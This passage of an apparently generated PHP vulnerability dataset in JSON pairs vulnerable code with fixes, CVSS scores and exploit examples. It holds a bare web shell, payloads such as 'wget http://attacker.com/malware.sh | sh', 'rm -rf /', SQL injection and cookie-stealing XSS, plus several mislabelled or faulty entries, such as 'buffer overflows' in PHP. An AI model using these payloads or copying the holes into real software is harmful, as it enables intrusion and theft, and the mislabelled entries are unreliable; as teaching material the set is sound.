            "By crafting a specific payload, an attacker could exploit this to escalate privileges on the server.",
            "The vulnerability allows for remote code execution through deserialization of specially crafted data."
        ]
    },
    "php_2": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "<?php\nfunction getFileContent($file) {\n    $baseDir = '/safe/directory/';\n    $filePath = realpath($baseDir . basename($file));\n    if (strpos($filePath, $baseDir) === 0) {\n        return file_get_contents($filePath);\n    } else {\n        return 'Access denied.';\n    }\n}\n\nif (isset($_GET['file'])) {\n    echo getFileContent($_GET['file']);\n}",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nfunction getFileContent($file) {\n    $baseDir = '/safe/directory/';\n    $whitelist = ['file1.txt', 'file2.txt']; // Add all allowed filenames here\n    if (in_array(basename($file), $whitelist)) {\n        $filePath = realpath($baseDir . basename($file));\n        return file_get_contents($filePath);\n    } else {\n        return 'Access denied.';\n    }\n}\n\nif (isset($_GET['file'])) {\n    echo getFileContent($_GET['file']);\n}",
        "exploit_ways": [
            "An attacker can use '..' in the file parameter to traverse directories, e.g., ?file=../../etc/passwd",
            "They could access other configuration files by navigating up directory levels and specifying filenames directly.",
            "Input like '?file=../../../../var/log/apache2/access.log' might allow reading web server logs."
        ]
    },
    "php_3": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n$conn = new mysqli($servername, $username, $password, $dbname);\nif ($conn->connect_error) {\n    die(\"Connection failed: \" . $conn->connect_error);\n}\n$id = $_GET['id'];\n$sql = \"SELECT * FROM users WHERE id=\" . $id;\n$result = $conn->query($sql);\nif ($result->num_rows > 0) {\n    while($row = $result->fetch_assoc()) {\n        echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"name\"]. \"<br>\";\n    }\n} else {\n    echo \"0 results\";\n}\n$conn->close();\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n$conn = new mysqli($servername, $username, $password, $dbname);\nif ($conn->connect_error) {\n    die(\"Connection failed: \" . $conn->connect_error);\n}\n$id = $_GET['id'];\n$stmt = $conn->prepare(\"SELECT * FROM users WHERE id = ?\");\n$stmt->bind_param(\"i\", $id);\n$stmt->execute();\n$result = $stmt->get_result();\nif ($result->num_rows > 0) {\n    while($row = $result->fetch_assoc()) {\n        echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"name\"]. \"<br>\";\n    }\n} else {\n    echo \"0 results\";\n}\n$stmt->close();\n$conn->close();\n?>",
        "exploit_ways": [
            "An attacker can input a value like '1 OR 1=1' to retrieve all user records.",
            "They can use a UNION SELECT statement, such as '1 UNION SELECT username, password FROM admin', to extract sensitive information from other tables.",
            "By injecting '--' at the end of an ID, attackers can comment out the rest of the query and potentially disrupt database operations."
        ]
    },
    "php_4": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "<?php\nclass UserProfile {\n    public function updateEmail($email) {\n        if ($_GET['update'] == 'true') {\n            // Update user email in database\n            echo \"Email updated to $email\";\n        }\n    }\n}",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nsession_start();\nclass UserProfile {\n    public function generateCsrfToken() {\n        if (empty($_SESSION['csrf_token'])) {\n            $_SESSION['csrf_token'] = bin2hex(random_bytes(32));\n        }\n        return $_SESSION['csrf_token'];\n    }\n\n    public function validateCsrfToken($token) {\n        return hash_equals($this->generateCsrfToken(), $token);\n    }\n\n    public function updateEmail($email, $csrfToken) {\n        if ($this->validateCsrfToken($csrfToken)) {\n            // Update user email in database\n            echo \"Email updated to $email\";\n        } else {\n            echo \"Invalid CSRF token.\";\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link with the update parameter set to true, tricking users into clicking it.",
            "By embedding an img tag in HTML with the src attribute pointing to the vulnerable script with the update parameter, attackers can exploit CSRF when users visit the page.",
            "Attackers can use social engineering to persuade users to perform actions on their behalf, such as updating their email to a malicious one."
        ]
    },
    "php_5": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "<?php\\nclass SafeHandler {\\n    private $data;\\n\\n    public function __construct($input) {\\n        $this->data = $input;\\n    }\\n\\n    public function process() {\\n        $buffer = str_repeat('A', 256);\\n        $buffer .= $this->data;\\n        return strlen($buffer);\\n    }\\n}\\n?>",
        "cvss_score": 7.8,
        "fixed_code": "<?php\nclass SafeHandler {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = substr($input, 0, 256);\n    }\n\n    public function process() {\n        $buffer = str_repeat('A', 256);\n        $buffer .= $this->data;\n        return strlen($buffer);\n    }\n}\n?>",
        "exploit_ways": [
            "An attacker can provide a string longer than 256 characters to overwrite adjacent memory.",
            "This could potentially allow overwriting the return address on the stack, leading to arbitrary code execution.",
            "Exploiting this overflow might lead to injection of shellcode that opens a reverse shell."
        ]
    },
    "php_6": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n\n// Create connection\n$conn = new mysqli($servername, $username, $password, $dbname);\n\n// Check connection\nif ($conn->connect_error) {\n    die(\"Connection failed: \" . $conn->connect_error);\n}\n\n$id = $_GET['id'];\n$sql = \"SELECT * FROM users WHERE id=$id\";\n$result = $conn->query($sql);\n\nif ($result->num_rows > 0) {\n    // output data of each row\n    while($row = $result->fetch_assoc()) {\n        echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"name\"]. \"<br>\";\n    }\n} else {\n    echo \"0 results\";\n}\n$conn->close();\n?>",
        "cvss_score": 8.2,
        "fixed_code": "<?php\n$servername = \"localhost\";\n$username = \"username\";\n$password = \"password\";\n$dbname = \"myDB\";\n\n// Create connection\n$conn = new mysqli($servername, $username, $password, $dbname);\n\n// Check connection\nif ($conn->connect_error) {\n    die(\"Connection failed: \" . $conn->connect_error);\n}\n\n$id = $_GET['id'];\n$stmt = $conn->prepare(\"SELECT * FROM users WHERE id=?\");\n$stmt->bind_param(\"i\", $id);\n$stmt->execute();\n$result = $stmt->get_result();\n\nif ($result->num_rows > 0) {\n    // output data of each row\n    while($row = $result->fetch_assoc()) {\n        echo \"id: \" . $row[\"id\"]. \" - Name: \" . $row[\"name\"]. \"<br>\";\n    }\n} else {\n    echo \"0 results\";\n}\n$conn->close();\n?>",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user records.",
            "Using input like '-1 UNION SELECT username, password FROM admin', an attacker can extract credentials from the admin table.",
            "By injecting '1; DROP TABLE users', an attacker can attempt to delete the users table."
        ]
    },
    "php_7": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "class ConfigLoader {\n    private $configPath;\n\n    public function __construct($path) {\n        $this->configPath = $path;\n    }\n\n    public function loadConfig() {\n        if (file_exists($this->configPath)) {\n            include($this->configPath);\n        } else {\n            throw new Exception(\"Configuration file not found.\");\n        }\n    }\n}",
        "cvss_score": 8.5,
        "fixed_code": "class ConfigLoader {\n    private $configPath;\n\n    public function __construct($path) {\n        if (!is_string($path)) {\n            throw new InvalidArgumentException(\"Invalid path provided.\");\n        }\n        $this->configPath = realpath($path);\n    }\n\n    public function loadConfig() {\n        if (file_exists($this->configPath) && is_file($this->configPath) && strpos(realpath($this->configPath), __DIR__) === 0) {\n            include($this->configPath);\n        } else {\n            throw new Exception(\"Configuration file not found or path traversal detected.\");\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could use a malicious PHP file located at a controlled path to execute arbitrary code.",
            "A path traversal vulnerability might allow an attacker to include files outside the expected directory, leading to RCE.",
            "By uploading a malicious file to the server, an attacker can specify its path and execute it through this class."
        ]
    },
    "php_8": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "<?php\nfunction getUserData($userId) {\n    $query = \"SELECT * FROM users WHERE id = $userId\";\n    return mysqli_query($connection, $query);\n}",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nfunction getUserData($userId) {\n    global $connection;\n    $stmt = mysqli_prepare($connection, \"SELECT * FROM users WHERE id = ?\");\n    mysqli_stmt_bind_param($stmt, \"i\", $userId);\n    mysqli_stmt_execute($stmt);\n    return mysqli_stmt_get_result($stmt);\n}",
        "exploit_ways": [
            "An attacker can input '1 OR 1=1' to retrieve all user data.",
            "They could use a UNION SELECT statement like '1 UNION SELECT username, password FROM users' to extract credentials.",
            "Inputting '-1; DROP TABLE users' could lead to deletion of the users table."
        ]
    },
    "php_9": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "<?php\\nclass FileReader {\\n    private $filePath;\\n\\n    public function __construct($path) {\\n        $this->filePath = $path;\\n    }\\n\\n    public function read() {\\n        return file_get_contents($this->filePath);\\n    }\\n}\\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\\nclass FileReader {\\n    private $baseDir;\\n    private $filePath;\\n\\n    public function __construct($path) {\\n        $this->baseDir = '/safe/directory/';\\n        $this->filePath = realpath($this->baseDir . '/' . basename($path));\\n        if (strpos($this->filePath, $this->baseDir) !== 0) {\\n            throw new Exception('Invalid file path');\\n        }\\n    }\\n\\n    public function read() {\\n        return file_get_contents($this->filePath);\\n    }\\n}\\n?>",
        "exploit_ways": [
            "An attacker can use '../' sequences to navigate to and access files outside the intended directory.",
            "By providing a crafted path, an attacker could potentially read sensitive system files like /etc/passwd.",
            "The vulnerability allows downloading of server-side configuration files by specifying appropriate paths."
        ]
    },
    "php_10": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "<?php function vulnerable($str) { $buffer = str_repeat('A', 256); $buffer .= $str; return strlen($buffer); } echo vulnerable($_GET['data']); ?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php function safe($str) { $max_length = 1024; if (strlen($str) > $max_length) { die('Input too long'); } $buffer = str_repeat('A', 256); $buffer .= $str; return strlen($buffer); } echo safe($_GET['data']); ?>",
        "exploit_ways": [
            "An attacker can send a very large string to overwrite the buffer and potentially execute arbitrary code.",
            "Could use carefully crafted input to manipulate the stack or heap, leading to privilege escalation.",
            "Injecting shellcode into the input could allow remote code execution if the buffer overflow is severe enough."
        ]
    },
    "php_11": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "<?php\nclass UserInputHandler {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = $input;\n    }\n\n    public function display() {\n        echo \"<div>\" . htmlspecialchars($this->data, ENT_QUOTES, 'UTF-8') . \"</div>\";\n    }\n}\n\n$inputHandler = new UserInputHandler($_GET['user_input']);\n$inputHandler->display();\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nclass UserInputHandler {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');\n    }\n\n    public function display() {\n        echo \"<div>\" . $this->data . \"</div>\";\n    }\n}\n\n$inputHandler = new UserInputHandler($_GET['user_input']);\n$inputHandler->display();\n?>",
        "exploit_ways": [
            "An attacker can inject JavaScript by providing a payload like <script>alert('XSS')</script> in the user_input parameter.",
            "Using HTML injection, an attacker might insert malicious tags such as <a href=&quot;javascript:alert('XSS')&quot;>click here</a> to lure users into executing code.",
            "By injecting CSS, an attacker can manipulate the page's appearance with payloads like <style>body{background-color:blue;}</style>"
        ]
    },
    "php_12": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "<?php system($_GET['cmd']); ?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nif (isset($_GET['cmd'])) {\n    $allowed_commands = ['ls', 'whoami'];\n    if (in_array($_GET['cmd'], $allowed_commands)) {\n        system($_GET['cmd']);\n    } else {\n        echo \"Command not allowed\";\n    }\n} ?>",
        "exploit_ways": [
            "An attacker can execute 'rm -rf /' to delete all files.",
            "Could use 'wget http://attacker.com/malware.sh | sh' to download and run a malicious script.",
            "Chain commands like 'ls; cat /etc/passwd' to list directory contents and steal password hashes."
        ]
    },
    "php_13": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "<?php\nsession_start();\nif (isset($_POST['username']) && isset($_POST['password'])) {\n    $user = $_POST['username'];\n    $pass = $_POST['password'];\n    if ($user === 'admin' && hash('sha256', $pass) === '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc5e69d5b2b1170e71') {\n        $_SESSION['admin'] = true;\n    }\n}\nif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {\n    if (isset($_POST['cmd'])) {\n        system($_POST['cmd']);\n    }\n}\necho '<form method=\"post\">Username: <input type=\"text\" name=\"username\"><br>Password: <input type=\"password\" name=\"password\"><br><input type=\"submit\"></form>';\nif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {\n    echo '<form method=\"post\">Command: <input type=\"text\" name=\"cmd\"><br><input type=\"submit\"></form>';\n}\n?>",
        "cvss_score": 9.0,
        "fixed_code": "<?php\nsession_start();\nif (isset($_POST['username']) && isset($_POST['password'])) {\n    $user = $_POST['username'];\n    $pass = $_POST['password'];\n    if ($user === 'admin' && hash('sha256', $pass) === '5e884898da28047151d0e56f8dc6292773603d0d6aabbddc5e69d5b2b1170e71') {\n        $_SESSION['admin'] = true;\n    }\n}\nif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {\n    if (isset($_POST['cmd'])) {\n        $allowedCommands = ['ls', 'whoami'];\n        $cmd = escapeshellarg(trim($_POST['cmd']));\n        if (in_array($cmd, $allowedCommands)) {\n            system($cmd);\n        } else {\n            echo \"Command not allowed\";\n        }\n    }\n}\necho '<form method=\"post\">Username: <input type=\"text\" name=\"username\"><br>Password: <input type=\"password\" name=\"password\"><br><input type=\"submit\"></form>';\nif (isset($_SESSION['admin']) && $_SESSION['admin'] === true) {\n    echo '<form method=\"post\">Command: <input type=\"text\" name=\"cmd\"><br><input type=\"submit\"></form>';\n}\n?>",
        "exploit_ways": [
            "An attacker can guess the admin password by trying common passwords.",
            "If logged in as admin, they could execute 'rm -rf /' to delete all files on the server.",
            "The admin can run arbitrary commands like 'curl attacker.com/malware.sh | sh' to install malware."
        ]
    },
    "php_14": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "<?php\n$name = $_GET['name'];\necho \"Hello, $name!\";\n?>",
        "cvss_score": 6.5,
        "fixed_code": "<?php\n$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');\necho \"Hello, $name!\";\n?>",
        "exploit_ways": [
            "An attacker can inject a script tag like '<script>alert(\\'XSS\\');</script>' to execute JavaScript in the user's browser.",
            "Could use '<img src=x onerror=alert(document.cookie)>' to steal cookies from users who visit the page.",
            "Injecting '<a href=javascript:alert(1)>Click me</a>' could deceive users into executing malicious code."
        ]
    },
    "php_15": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "<?php\nfunction read_large_file($filename) {\n    $handle = fopen($filename, \"r\");\n    if ($handle) {\n        while (($buffer = fgets($handle)) !== false) {\n            // Process buffer...\n        }\n        fclose($handle);\n    }\n}\n\n$largeFileContent = str_repeat('A', 1024 * 1024 * 5); // Large string to simulate large file content\nread_large_file(\"data://text/plain,\" . $largeFileContent);\n?>",
        "cvss_score": 7.8,
        "fixed_code": "<?php\nfunction read_large_file($filename) {\n    $handle = fopen($filename, \"r\");\n    if ($handle) {\n        while (($buffer = fgets($handle, 4096)) !== false) { // Limit buffer size\n            // Process buffer...\n        }\n        fclose($handle);\n    }\n}\n\n$largeFileContent = str_repeat('A', 1024 * 1024 * 5); // Large string to simulate large file content\nread_large_file(\"data://text/plain,\" . $largeFileContent);\n?>",
        "exploit_ways": [
            "An attacker could create a very large input that exceeds memory limits, causing a denial of service.",
            "By crafting the input data carefully, an attacker might exploit this to overwrite adjacent memory space, leading to code execution.",
            "In environments with limited resources, a buffer overflow can cause the application or server to crash under load."
        ]
    },
    "php_17": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileHandler {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function readFile() {\n        $safePath = basename($this->filePath);\n        if (file_exists($safePath)) {\n            return file_get_contents($safePath);\n        }\n        return \"File not found\";\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileHandler {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = realpath($path);\n        if (!$this->filePath || strpos($this->filePath, '/safe/directory/') !== 0) {\n            throw new Exception('Invalid path');\n        }\n    }\n\n    public function readFile() {\n        if (file_exists($this->filePath)) {\n            return file_get_contents($this->filePath);\n        }\n        return \"File not found\";\n    }\n}",
        "exploit_ways": [
            "An attacker can provide a path like '../../etc/passwd' to access sensitive system files.",
            "Using '../..' traversal, an attacker might read configuration files located in parent directories.",
            "Crafting a request with a carefully constructed path could lead to the exposure of user data or other critical information."
        ]
    },
    "php_18": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "<?php\\nclass User {\\n    public $username;\\n    public $isAdmin;\\n\\n    function __construct($username) {\\n        $this->username = $username;\\n        $this->isAdmin = false;\\n    }\\n\\n    function login() {\\n        if ($this->username == 'admin') {\\n            $this->isAdmin = true;\\n        }\\n    }\\n}\\n$user = unserialize($_GET['user']);\\n$user->login();\\nif ($user->isAdmin) {\\n    echo \"Admin Privileges Granted\";\\n} else {\\n    echo \"User Privileges\";\\n}\\n?>",
        "cvss_score": 8.2,
        "fixed_code": "<?php\nclass User {\n    private $username;\n    private $isAdmin;\n\n    function __construct($username) {\n        $this->username = $username;\n        $this->isAdmin = false;\n    }\n\n    function login() {\n        if ($this->username == 'admin') {\n            $this->isAdmin = true;\n        }\n    }\n\n    public function isAdmin() {\n        return $this->isAdmin;\n    }\n}\n$username = filter_input(INPUT_GET, 'user', FILTER_SANITIZE_STRING);\n$user = new User($username);\n$user->login();\nif ($user->isAdmin()) {\n    echo \"Admin Privileges Granted\";\n} else {\n    echo \"User Privileges\";\n}\n?>",
        "exploit_ways": [
            "An attacker can serialize a malicious User object with isAdmin set to true and pass it as the 'user' parameter.",
            "By crafting a serialized payload, an attacker can inject arbitrary PHP code execution when unserialized.",
            "Exploiting this vulnerability allows unauthorized users to gain administrative access by manipulating input data."
        ]
    },
    "php_19": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "<?php\nfunction authenticate($username, $password) {\n    if ($username == 'admin' && $password == 'password') {\n        return true;\n    }\n    return false;\n}",
        "cvss_score": 6.5,
        "fixed_code": "<?php\nfunction authenticate($username, $password) {\n    $hashedPassword = '$2y$10$examplehash'; // Example hash of 'password'\n    if ($username === 'admin' && password_verify($password, $hashedPassword)) {\n        return true;\n    }\n    return false;\n}",
        "exploit_ways": [
            "An attacker can simply use the username 'admin' and the password 'password' to authenticate.",
            "If the hash is known or leaked, an attacker could attempt brute force attacks on the hashed password.",
            "Potential code injection if the function is used improperly elsewhere in the application."
        ]
    },
    "php_20": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "<?php\nfunction updateUserRole($userId, $role) {\n    global $conn;\n    $stmt = $conn->prepare('UPDATE users SET role=? WHERE id=?');\n    if (!$stmt) {\n        die('Error preparing statement: ' . $conn->error);\n    }\n    $stmt->bind_param('si', $role, $userId);\n    if ($stmt->execute()) {\n        echo 'Role updated successfully.';\n    } else {\n        echo 'Error updating role: ' . $stmt->error;\n    }\n    $stmt->close();\n}\n\nif (isset($_POST['update'])) {\n    updateUserRole($_POST['user_id'], $_POST['role']);\n}\n?>",
        "cvss_score": 8.5,
        "fixed_code": "<?php\nfunction updateUserRole($userId, $role) {\n    global $conn;\n    if (!in_array($role, ['admin', 'user', 'guest'])) {\n        die('Invalid role specified.');\n    }\n    $stmt = $conn->prepare('UPDATE users SET role=? WHERE id=?');\n    if (!$stmt) {\n        die('Error preparing statement: ' . $conn->error);\n    }\n    $stmt->bind_param('si', $role, $userId);\n    if ($stmt->execute()) {\n        echo 'Role updated successfully.';\n    } else {\n        echo 'Error updating role: ' . $stmt->error;\n    }\n    $stmt->close();\n}\n\nif (isset($_POST['update'])) {\n    updateUserRole($_POST['user_id'], $_POST['role']);\n}\n?>",
        "exploit_ways": [
            "An attacker can submit a POST request with an invalid role to potentially cause unexpected behavior.",
            "If the user ID is not properly validated, an attacker might be able to update roles for other users.",
            "Crafting a malicious request could allow an attacker to elevate their own privileges or others'."
        ]
    },
    "php_21": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "<?php\nclass UserInput {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = $input;\n    }\n\n    public function display() {\n        echo \"<div>\" . $this->data . \"</div>\";\n    }\n}\n?>",
        "cvss_score": 7.5,
        "fixed_code": "<?php\nclass UserInput {\n    private $data;\n\n    public function __construct($input) {\n        $this->data = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');\n    }\n\n    public function display() {\n        echo \"<div>\" . $this->data . \"</div>\";\n    }\n}\n?>",
        "exploit_ways": [
            "An attacker can input '<script>alert(\\'XSS\\')</script>' to execute JavaScript in the victim's browser.",
            "They could use '<img src=x onerror=alert(1)>' to trigger a script when the image fails to load, potentially stealing cookies or other data.",
            "Crafting malicious URLs with embedded scripts can lead to session hijacking if users click on them."
        ]
    },
    "php_22": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\\n    private $filePath;\\n\\n    public function __construct($path) {\\n        $this->filePath = $path;\\n    }\\n\\n    public function readFile() {\\n        if (file_exists($this->filePath)) {\\n            return file_get_contents($this->filePath);\\n        }\\n        return 'File not found.';\\n    }\\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\\n    private $basePath;\\n    private $filePath;\\n\\n    public function __construct($base, $path) {\\n        $this->basePath = rtrim($base, DIRECTORY_SEPARATOR);\\n        $this->filePath = $this->sanitizePath($path);\\n    }\\n\\n    private function sanitizePath($path) {\\n        return basename($path);\\n    }\\n\\n    public function readFile() {\\n        $fullPath = $this->basePath . DIRECTORY_SEPARATOR . $this->filePath;\\n        if (file_exists($fullPath)) {\\n            return file_get_contents($fullPath);\\n        }\\n        return 'File not found.';\\n    }\\n}",
        "exploit_ways": [
            "An attacker can input '../etc/passwd' to read the system's password file.",
            "Could use '../../var/log/syslog' to access sensitive log files.",
            "Input like '../../../index.php' can allow retrieval of application source code."
        ]
    },
    "php_23": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function read() {\n        return file_get_contents($this->filePath);\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\n    private $basePath;\n    private $filePath;\n\n    public function __construct($base, $path) {\n        $this->basePath = rtrim(realpath($base), DIRECTORY_SEPARATOR);\n        $fullPath = realpath($this->basePath . DIRECTORY_SEPARATOR . $path);\n        if (strpos($fullPath, $this->basePath) === 0) {\n            $this->filePath = $fullPath;\n        } else {\n            throw new Exception('Invalid file path');\n        }\n    }\n\n    public function read() {\n        return file_get_contents($this->filePath);\n    }\n}",
        "exploit_ways": [
            "An attacker can input '../..' to navigate up directories and access files outside the intended directory.",
            "Using '%2e%2e/%2e%2e' URL encoded traversal to reach sensitive system files or configuration data.",
            "Crafting requests with null byte injection like 'filename.php%00.jpg' could bypass certain security checks in older PHP versions."
        ]
    },
    "php_24": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "class DatabaseHandler {\n    private $connection;\n\n    public function __construct($host, $username, $password, $dbname) {\n        $this->connection = new mysqli($host, $username, $password, $dbname);\n        if ($this->connection->connect_error) {\n            die(\"Connection failed: \" . $this->connection->connect_error);\n        }\n    }\n\n    public function getUserById($id) {\n        $query = \"SELECT * FROM users WHERE id=\\\"\" . $this->connection->real_escape_string($id) . \"\\\"\";\n        $result = $this->connection->query($query);\n        return $result->fetch_assoc();\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class DatabaseHandler {\n    private $connection;\n\n    public function __construct($host, $username, $password, $dbname) {\n        $this->connection = new mysqli($host, $username, $password, $dbname);\n        if ($this->connection->connect_error) {\n            die(\"Connection failed: \" . $this->connection->connect_error);\n        }\n    }\n\n    public function getUserById($id) {\n        $stmt = $this->connection->prepare(\"SELECT * FROM users WHERE id=?\");\n        $stmt->bind_param(\"i\", $id);\n        $stmt->execute();\n        $result = $stmt->get_result();\n        return $result->fetch_assoc();\n    }\n}",
        "exploit_ways": [
            "An attacker can inject SQL code like '1 OR 1=1' to retrieve all user data.",
            "They could use a UNION SELECT statement to extract additional information from the database.",
            "By providing crafted input, an attacker might cause a denial of service by consuming database resources."
        ]
    },
    "php_25": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "<?php\nsession_start();\ninclude 'config.php';\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $user_id = $_SESSION['user_id'];\n    $action = $_POST['action'];\n    if ($action == 'subscribe') {\n        // Simulate a database update to subscribe the user\n        echo \"Subscribed successfully!\";\n    }\n}\n\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Subscribe</title>\n    <style>\n        #subscribeFrame {\n            width: 300px;\n            height: 200px;\n            position: absolute;\n            top: -100px;\n            left: -100px;\n            opacity: 0.05;\n            z-index: 9999;\n        }\n    </style>\n</head>\n<body>\n    <h1>Welcome to our service!</h1>\n    <form method=\"post\" action=\"\">\n        <input type=\"submit\" name=\"action\" value=\"subscribe\" />\n    </form>\n\n    <!-- Hidden iframe for clickjacking -->\n    <iframe id=\"subscribeFrame\" src=\"http://malicious-site.com/steal-subscription\"></iframe>\n</body>\n</html>",
        "cvss_score": 3.5,
        "fixed_code": "<?php\nsession_start();\ninclude 'config.php';\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $user_id = $_SESSION['user_id'];\n    $action = filter_input(INPUT_POST, 'action', FILTER_SANITIZE_STRING);\n    if ($action == 'subscribe') {\n        // Simulate a database update to subscribe the user\n        echo \"Subscribed successfully!\";\n    }\n}\n\n?>\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>Subscribe</title>\n    <style>\n        body {\n            position: relative;\n        }\n        iframe {\n            display: none;\n        }\n    </style>\n</head>\n<body>\n    <h1>Welcome to our service!</h1>\n    <form method=\"post\" action=\"\">\n        <input type=\"submit\" name=\"action\" value=\"subscribe\" />\n    </form>\n</body>\n</html>",
        "exploit_ways": [
            "An attacker can overlay the hidden iframe to trick users into clicking it, causing unintended actions on their behalf.",
            "Users could be misled into performing unwanted subscriptions or other actions without being aware of the malicious frame.",
            "By manipulating the iframe's source, attackers might attempt to steal user data or perform unauthorized transactions."
        ]
    },
    "php_26": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "<?php\nclass Website {\n    public function renderPage() {\n        echo '<html><head><title>My Site</title></head><body>Hello World!</body></html>';\n    }\n}\n$site = new Website();\n$site->renderPage();",
        "cvss_score": 3.6,
        "fixed_code": "<?php\nheader(\"Content-Security-Policy: default-src 'self'\");\nheader(\"X-Content-Type-Options: nosniff\");\nheader(\"X-Frame-Options: SAMEORIGIN\");\nheader(\"Strict-Transport-Security: max-age=31536000; includeSubDomains\");\nclass Website {\n    public function renderPage() {\n        echo '<html><head><title>My Site</title></head><body>Hello World!</body></html>';\n    }\n}\n$site = new Website();\n$site->renderPage();",
        "exploit_ways": [
            "An attacker could inject malicious scripts into the page to perform XSS attacks.",
            "Without Content-Security-Policy, an attacker can load resources from untrusted domains leading to potential data leakage or execution of malicious content.",
            "Lack of X-Frame-Options header allows Clickjacking attacks where attackers trick users into clicking on something different than what they perceive."
        ]
    },
    "php_27": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "<?php\nclass FileManager {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        file_put_contents($this->filePath, $data);\n    }\n\n    public function appendToFile($data) {\n        file_put_contents($this->filePath, $data, FILE_APPEND);\n    }\n}",
        "cvss_score": 5.3,
        "fixed_code": "<?php\nclass FileManager {\n    private $filePath;\n\n    public function __construct($path) {\n        $this->filePath = $path;\n    }\n\n    public function writeToFile($data) {\n        file_put_contents($this->filePath, $data, LOCK_EX);\n    }\n\n    public function appendToFile($data) {\n        file_put_contents($this->filePath, $data, FILE_APPEND | LOCK_EX);\n    }\n}",
        "exploit_ways": [
            "An attacker could exploit the race condition to corrupt the file by writing conflicting data simultaneously.",
            "By manipulating file access timing, an attacker might inject malicious content into a configuration or log file.",
            "Race conditions can lead to unauthorized modifications if multiple processes attempt to write to the same file without proper locking mechanisms."
        ]
    },
    "php_28": {
        "vulnerability_type": "Information Disclosure (Low Severity)",
        "vulnerability_code": "<?php\nfunction logUserAccess($userId) {\n    $logFile = '/var/log/user_access.log';\n    $userData = shell_exec('grep \\'\" . escapeshellarg($userId) . \"\\' /etc/passwd');\n    file_put_contents($logFile, $userData, FILE_APPEND);\n}",
        "cvss_score": 4.2,
        "fixed_code": "<?php\nfunction logUserAccess($userId) {\n    $logFile = '/var/log/user_access.log';\n    $lines = file('/etc/passwd', FILE_IGNORE_NEW_LINES);\n    foreach ($lines as $line) {\n        if (strpos($line, $userId) !== false) {\n            file_put_contents($logFile, $line . \"\\n\", FILE_APPEND);\n            break;\n        }\n    }\n}",
        "exploit_ways": [
            "An attacker could provide a user ID that includes special characters to leak additional information from /etc/passwd.",
            "By crafting the input carefully, an attacker might be able to retrieve unexpected or sensitive lines from system files.",
            "The vulnerability might allow for local file reading if the input is not properly sanitized, leading to information disclosure."
        ]
    },
    "php_29": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
